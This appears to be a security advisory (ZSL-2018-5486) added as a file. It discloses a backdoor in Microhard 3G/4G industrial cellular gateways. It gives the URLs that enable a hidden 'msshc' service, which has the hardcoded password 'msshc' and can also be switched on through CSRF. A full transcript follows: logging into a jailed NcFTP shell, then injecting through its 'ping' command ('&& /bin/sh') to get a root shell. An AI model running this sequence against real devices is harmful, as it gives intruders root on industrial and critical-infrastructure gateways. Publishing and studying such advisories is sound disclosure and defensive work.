@@ -1,0 +1,291 @@
+Microhard Systems 3G/4G Cellular Ethernet and Serial Gateway Backdoor Jailbreak
+
+
+Vendor: Microhard Systems Inc.
+Product web page: http://www.microhardcorp.com
+Affected version: IPn4G 1.1.0 build 1098
+                  IPn3Gb 2.2.0 build 2160
+                  IPn4Gb 1.1.6 build 1184-14
+                  IPn4Gb 1.1.0 Rev 2 build 1090-2
+                  IPn4Gb 1.1.0 Rev 2 build 1086
+                  Bullet-3G 1.2.0 Rev A build 1032
+                  VIP4Gb 1.1.6 build 1204
+                  VIP4G 1.1.6 Rev 3.0 build 1184-14
+                  VIP4G-WiFi-N 1.1.6 Rev 2.0.0 build 1196
+                  IPn3Gii / Bullet-3G 1.2.0 build 1076
+                  IPn4Gii / Bullet-LTE 1.2.0 build 1078
+                  BulletPlus 1.3.0 build 1036
+                  Dragon-LTE 1.1.0 build 1036
+
+Summary: The new IPn4Gb provides a rugged, industrial strength wireless solution
+using the new and ultra fast 4G LTE cellular network infrastructure. The IPn4Gb
+features integrated Firewall, IPSec / VPN & GRE Tunneling, IP/MAC Access Control
+Lists. The IPn4Gb can transport critical data to and from SMS, Ethernet and Serial
+RS232/485/422 devices!
+
+The IPn3Gb provides a fast, secure industrial strength wireless solution that uses
+the widespread deployment of cellular network infrastructure for critical data collection.
+From remote meters and sensors, to providing mobile network access, the IPn3Gb delivers!
+The IPn3Gb is a powerful HSPA+ and Quad Band GSM device compatible almost anywhere. It
+provides robust and secure wireless communication of Serial, USB and Ethernet data.
+
+The all new Bullet-3G provides a compact, robust, feature packed industrial strength
+wireless solution using fast 3G/HSPA+ network infrastructure. The Bullet-3G takes things
+to the next level by providing features such as Ethernet with PoE, RS232 Serial port
+and 2x Programmable I/O. Offering enhanced, 'Secure Communication' with its integrated
+Firewall, IPSec VPN Tunneling, IP/MAC Access Control Lists, the Bullet-3G is a solution
+worth looking at!
+
+The all new Dragon-LTE provides a feature packed, compact OEM, industrial strength
+wireless IoT & M2M solution. Connect any device, wired or wireless, and provide remote
+cellular access using the Dragon-LTE. The Dragon-LTE features a OEM design for tight
+system integration and design flexibility with dual Ethernet Ports and high power
+802.11b/g/n WIFI. With its integrated Firewall, IPSec VPN Tunneling and IP/MAC Access
+Control Lists, the Dragon-LTE provides a solution for any cellular application!
+
+The new VIP4Gb provides a rugged, industrial strength wireless solution using 4G LTE
+network infrastructure for critical data communications. The VIP4Gb provides simultaneous
+network connections for 802.11a/b/g/n WiFi devices, 4 x 10/100/1000 Ethernet ports, Digital
+I/O, and a RS232/RS485 port, resulting in a communication device that can be deployed in
+any application! The VIP4Gb is a powerful 4G LTE device compatible on any cellular network.
+It provides robust and secure wireless communication of Serial, Ethernet & WiFi data.
+
+Desc: The web shell application includes a service called Microhard Sh that is documented
+only as 'reserved for internal use'. This service can be enabled by an authenticated
+user within the Services menu in the web admin panel. This can also be enabled via CSRF
+attack. When the service is enabled, a user 'msshc' is created on the system with password
+'msshc' for SSH shell access on port 22. When connected, the user is dropped into a NcFTP
+jailed environment, that has limited commands for file transfer administration. One of the
+commands is a custom added 'ping' command that has a command injection vulnerability that
+allows the attacker to escape the restricted environment and enter into a root shell terminal
+that can execute commands as the root user. 
+
+Tested on: httpd-ssl-1.0.0
+           Linux 2.6.32.9 (Bin@DProBuilder) (gcc version 4.4.3)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5486
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5486.php
+
+
+13.03.2018
+
+--
+
+
+1) Enable Microhard Sh service:
+-------------------------------
+
+http://192.168.1.1/cgi-bin/webif/system-services.sh?service=msshc&action=start - Start the Microhard Sh (msshc) service
+http://192.168.1.1/cgi-bin/webif/system-services.sh?service=msshc&action=enable - Auto-enable (auto-start)
+
+
+2) Check what happens when enabling Microhard Sh service:
+---------------------------------------------------------
+
+# cat /etc/init.d/msshc
+#!/bin/sh /etc/rc.common
+# Copyright (C) 2013 Microhardcorp
+
+start() {
+  deluser msshc
+  rm -rf /tmp/msshc
+  mkdir -p /tmp/msshc
+  msshcshell=$(cat /etc/shells | grep -c "/etc/msshc.sh")
+  [ $msshcshell -gt 0 ] || echo "/etc/msshc.sh" >> /etc/shells
+  passwd=$(/sbin/uci get msshc.general.passwd)
+  echo "$passwd" >> /etc/passwd
+}
+
+stop() {
+  deluser msshc
+  rm -rf /tmp/msshc
+}
+
+
+3) Check the /etc/msshc.sh script:
+----------------------------------
+
+# cat /etc/msshc.sh
+#!/bin/sh 
+# Copyright (C) 2013 Microhardcorp
+
+/usr/bin/ncftp
+
+exit 0
+
+
+4) Check the /sbin/uci binary:
+------------------------------
+
+Usage: /sbin/uci [<options>] <command> [<arguments>]
+
+Commands:
+    batch
+    export     [<config>]
+    import     [<config>]
+    changes    [<config>]
+    commit     [<config>]
+    add        <config> <section-type>
+    add_list   <config>.<section>.<option>=<string>
+    show       [<config>[.<section>[.<option>]]]
+    get        <config>.<section>[.<option>]
+    set        <config>.<section>[.<option>]=<value>
+    delete     <config>[.<section[.<option>]]
+    rename     <config>.<section>[.<option>]=<name>
+    revert     <config>[.<section>[.<option>]]
+
+Options:
+    -c <path>  set the search path for config files (default: /etc/config)
+    -d <str>   set the delimiter for list values in uci show
+    -f <file>  use <file> as input instead of stdin
+    -L         do not load any plugins
+    -m         when importing, merge data into an existing package
+    -n         name unnamed sections on export (default)
+    -N         don't name unnamed sections
+    -p <path>  add a search path for config change files
+    -P <path>  add a search path for config change files and use as default
+    -q         quiet mode (don't print error messages)
+    -s         force strict mode (stop on parser errors, default)
+    -S         disable strict mode
+    -X         do not use extended syntax on 'show'
+
+# /sbin/uci get msshc.general.passwd
+msshc:$1$bM7uisGu$iMRC.LVlXjKAv7Y07t1fm/:0:0:root:/tmp/msshc:/etc/msshc.sh
+
+
+5) Check the NcFTP binary:
+--------------------------
+
+# /usr/bin/ncftp -h
+
+Usage:  ncftp [flags] [<host> | <directory URL to browse>]
+
+Flags:
+  -u XX  Use username XX instead of anonymous.
+  -p XX  Use password XX with the username.
+  -P XX  Use port number XX instead of the default FTP service port (21).
+  -j XX  Use account XX with the username (rarely needed).
+  -F     Dump a sample $HOME/.ncftp/firewall prefs file to stdout and exit.
+
+Program version:  NcFTP 3.2.5/474 Feb 02 2011, 05:13 PM
+Library version:  LibNcFTP 3.2.5 (January 17, 2011)
+Build system:     Linux DProBuilder 2.6.34.9-69.fc13.i686.PAE #1 SMP Tue Ma...
+
+This is a freeware program by Mike Gleason (http://www.NcFTP.com).
+A directory URL ends in a slash, i.e. ftp://ftp.freebsd.org/pub/FreeBSD/
+Use ncftpget and ncftpput for command-line FTP and file URLs.
+
+
+6) Go to jail:
+--------------
+
+lqwrm@metalgear:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 msshc@192.168.1.1
+The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.
+RSA key fingerprint is SHA256:x9GG/Dlkg88058ilA2xyhYqllYRgZOTPu6reGS8K1Yg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.1' (RSA) to the list of known hosts.
+msshc@192.168.1.1's password: 
+NcFTP 3.2.5 (Feb 02, 2011) by Mike Gleason (http://www.NcFTP.com/contact/).
+
+Copyright (c) 1992-2011 by Mike Gleason.
+All rights reserved.
+
+ncftp> ?
+Commands may be abbreviated.  'help showall' shows hidden and unsupported 
+commands.  'help <command>' gives a brief description of <command>.
+
+ascii    close    help     mkdir    put      rename   set      umask  
+binary   debug    lls      open     pwd      rhelp    show     
+cd       dir      lrm      passive  quit     rm       site     
+chmod    get      ls       ping     quote    rmdir    type     
+
+For details, please see the manual ("man ncftp" at your regular shell prompt
+or online at http://www.NcFTP.com/ncftp/doc/ncftp.html).
+ncftp> help showall
+Commands may be abbreviated.  'help showall' shows hidden and unsupported
+commands.  'help <command>' gives a brief description of <command>.
+
+?        chmod    exit     ls       mv       pwd      rhelp    site
+ascii    close    get      mget     open     quit     rm       type
+binary   debug    help     mkdir    passive  quote    rmdir    umask
+bye      delete   lls      mls      ping     rename   set
+cd       dir      lrm      mput     put      rglob    show
+
+For details, please see the manual ("man ncftp" at your regular shell prompt
+or online at http://www.NcFTP.com/ncftp/doc/ncftp.html).
+ncftp> ls
+ls: must be connected to do that.
+ncftp> man ncftp
+man: no such command.
+ncftp> pwd
+pwd: must be connected to do that.
+ncftp> show
+anon-password                  NcFTP@
+auto-ascii                     |.txt|.asc|.html|.htm|.css|.xml|.ini|.pl|.hqx|.cfg|.c|.h|.cpp|.hpp|.bat|.m3u|.pls|
+auto-resume                    no
+autosave-bookmark-changes      no
+confirm-close                  no
+connect-timeout                20
+control-timeout                135
+logsize                        10240
+pager                          more
+passive                        optional
+progress-meter                 2 (statbar)
+redial-delay                   20
+save-passwords                 ask
+show-status-in-xterm-titlebar  no
+so-bufsize                     0 (use system default)
+xfer-timeout                   3600
+yes-i-know-about-NcFTPd        no
+ncftp>
+
+
+7) The Shawshank Redemption:
+---------------------------- 
+
+ncftp> ping -c1 -4 0.0.0.0 `id` 
+BusyBox v1.15.3 (2016-06-20 14:58:14 MDT) multi-call binary
+
+Usage: ping [OPTIONS] HOST
+
+Send ICMP ECHO_REQUEST packets to network hosts
+
+Options:
+    -4, -6        Force IPv4 or IPv6 hostname resolution
+    -c CNT        Send only CNT pings
+    -s SIZE        Send SIZE data bytes in packets (default:56)
+    -I IFACE/IP    Use interface or IP address as source
+    -W SEC        Seconds to wait for the first response (default:10)
+            (after all -c CNT packets are sent)
+    -w SEC        Seconds until ping exits (default:infinite)
+            (can exit earlier with -c CNT)
+    -q        Quiet, only displays output at start
+            and when finished
+
+ncftp>
+
+
+8) Come on Andy:
+----------------
+
+ncftp> ping -c1 -4 0.0.0.0 && /bin/sh
+PING 0.0.0.0 (0.0.0.0): 56 data bytes
+64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.423 ms
+
+--- 0.0.0.0 ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.423/0.423/0.423 ms
+
+
+BusyBox v1.15.3 (2016-06-20 14:58:14 MDT) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+/tmp/msshc # id ; uname -r
+uid=0(root) gid=0(root)
+2.6.32.9
+/tmp/msshc #
